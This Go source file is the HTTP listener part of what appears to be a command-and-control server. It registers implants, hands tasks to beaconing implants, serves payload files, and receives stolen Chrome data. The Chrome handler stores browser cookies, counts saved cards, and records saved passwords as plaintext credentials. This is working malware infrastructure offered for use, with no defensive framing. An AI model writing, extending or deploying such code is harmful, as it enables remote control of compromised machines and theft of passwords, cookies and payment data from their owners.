package listeners

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sync"

	"github.com/carved4/carved/server/pkg/db"
	"github.com/carved4/carved/shared/proto"
)

type Manager struct {
	listeners	map[string]*HTTPListener
	mu		sync.RWMutex
}

func NewManager() *Manager {
	return &Manager{
		listeners: make(map[string]*HTTPListener),
	}
}

type HTTPListener struct {
	config	*db.Listener
	server	*http.Server
	mux	*http.ServeMux
}

func (m *Manager) Start(l *db.Listener) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, exists := m.listeners[l.ID]; exists {
		return fmt.Errorf("listener already running")
	}

	hl := &HTTPListener{
		config:	l,
		mux:	http.NewServeMux(),
	}

	hl.mux.HandleFunc("/register", hl.handleRegister)
	hl.mux.HandleFunc("/beacon", hl.handleBeacon)
	hl.mux.HandleFunc("/payloads/", hl.handlePayload)
	hl.mux.HandleFunc("/chrome/result", hl.handleChromeResult)

	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("[!] Unmatched request: %s %s\n", r.Method, r.URL.Path)
		http.Error(w, "not found", http.StatusNotFound)
	})

	addr := fmt.Sprintf("%s:%d", l.Host, l.Port)
	hl.server = &http.Server{
		Addr:		addr,
		Handler:	hl.mux,
	}

	go func() {
		var err error
		if l.Type == proto.ListenerHTTPS {

			err = hl.server.ListenAndServe()
		} else {
			err = hl.server.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			fmt.Printf("[!] Listener %s error: %v\n", l.Name, err)
		}
	}()

	m.listeners[l.ID] = hl
	l.Active = true
	db.SaveListener(l)

	fmt.Printf("[+] Started listener %s on %s\n", l.Name, addr)
	return nil
}

func (m *Manager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	hl, exists := m.listeners[id]
	if !exists {
		return fmt.Errorf("listener not found")
	}

	if err := hl.server.Close(); err != nil {
		return err
	}

	delete(m.listeners, id)

	hl.config.Active = false
	db.SaveListener(hl.config)

	fmt.Printf("[+] Stopped listener %s\n", hl.config.Name)
	return nil
}

func (m *Manager) GetActive() []*db.Listener {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var active []*db.Listener
	for _, hl := range m.listeners {
		active = append(active, hl.config)
	}
	return active
}

func (m *Manager) IsActive(id string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	_, exists := m.listeners[id]
	return exists
}

func (hl *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var meta proto.ImplantMeta
	if err := json.Unmarshal(body, &meta); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if err := db.SaveImplant(&meta); err != nil {
		fmt.Printf("[!] Failed to save implant: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[+] New implant: %s@%s (%s) PID:%d\n", meta.Username, meta.Hostname, meta.ID[:8], meta.PID)

	if imp, err := db.GetImplant(meta.ID); err != nil {
		fmt.Printf("[!] Verify failed: %v\n", err)
	} else {
		fmt.Printf("[*] Saved implant ID: %s\n", imp.ID)
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}

func (hl *HTTPListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var beacon proto.Beacon
	if err := json.Unmarshal(body, &beacon); err != nil {
		fmt.Printf("[!] Beacon parse error: %v (body: %s)\n", err, string(body))
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if err := db.UpdateImplantLastSeen(beacon.ImplantID); err != nil {
		fmt.Printf("[!] UpdateImplantLastSeen error: %v\n", err)
	}

	if len(beacon.Results) > 0 {
		fmt.Printf("[*] Received %d results from %s\n", len(beacon.Results), beacon.ImplantID[:8])
	}
	for _, result := range beacon.Results {
		if err := db.SaveTaskResult(result); err != nil {
			fmt.Printf("[!] SaveTaskResult error for task %s: %v\n", result.TaskID[:8], err)
		} else {
			outputPreview := ""
			if len(result.Output) > 0 {
				outputPreview = fmt.Sprintf(" (%d bytes output)", len(result.Output))
			}
			if result.Error != "" {
				outputPreview = fmt.Sprintf(" (error: %s)", result.Error)
			}
			fmt.Printf("[+] Task %s completed: %s%s\n", result.TaskID[:8], result.Status, outputPreview)
		}
	}

	tasks, err := db.GetPendingTasks(beacon.ImplantID)
	if err != nil {
		fmt.Printf("[!] GetPendingTasks error: %v\n", err)
		tasks = []*proto.Task{}
	}

	if len(tasks) > 0 {
		fmt.Printf("[*] Sending %d tasks to %s: ", len(tasks), beacon.ImplantID[:8])
		for i, t := range tasks {
			if i > 0 {
				fmt.Printf(", ")
			}
			fmt.Printf("%s(%s)", t.Type, t.ID[:8])
		}
		fmt.Println()
	}

	resp := proto.BeaconResponse{Tasks: tasks}
	respData, _ := json.Marshal(resp)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(respData)
}

func (hl *HTTPListener) handleChromeResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		fmt.Printf("[!] Chrome result parse error: %v\n", err)
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if errMsg, ok := result["error"]; ok {
		fmt.Printf("[!] Chrome extraction error: %v\n", errMsg)
	} else {

		cookies := 0
		passwords := 0
		cards := 0
		if c, ok := result["cookies"].([]interface{}); ok {
			cookies = len(c)
		}
		if p, ok := result["passwords"].([]interface{}); ok {
			passwords = len(p)
		}
		if cc, ok := result["cards"].([]interface{}); ok {
			cards = len(cc)
		}
		fmt.Printf("[+] Chrome extraction: %d cookies, %d passwords, %d cards\n", cookies, passwords, cards)

		if passwords > 0 {
			if pwList, ok := result["passwords"].([]interface{}); ok {
				for _, pw := range pwList {
					if pwMap, ok := pw.(map[string]interface{}); ok {
						cred := &db.Credential{
							Type:		"plaintext",
							Username:	getString(pwMap, "username"),
							Secret:		getString(pwMap, "password"),
							Domain:		getString(pwMap, "url"),
							Source:		"chrome/" + getString(pwMap, "profile"),
						}
						db.SaveCredential(cred)
					}
				}
			}
		}
	}

	db.StoreChromeResult(body)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}

func getString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func (hl *HTTPListener) handlePayload(w http.ResponseWriter, r *http.Request) {

	path := r.URL.Path
	if len(path) <= len("/payloads/") {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	filename := path[len("/payloads/"):]

	if filepath.Base(filename) != filename {
		http.Error(w, "invalid filename", http.StatusBadRequest)
		return
	}

	payloadPath := filepath.Join("payloads", filename)

	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		fmt.Printf("[!] Payload not found: %s\n", payloadPath)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	data, err := os.ReadFile(payloadPath)
	if err != nil {
		fmt.Printf("[!] Failed to read payload: %v\n", err)
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[*] Serving payload %s (%d bytes)\n", filename, len(data))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

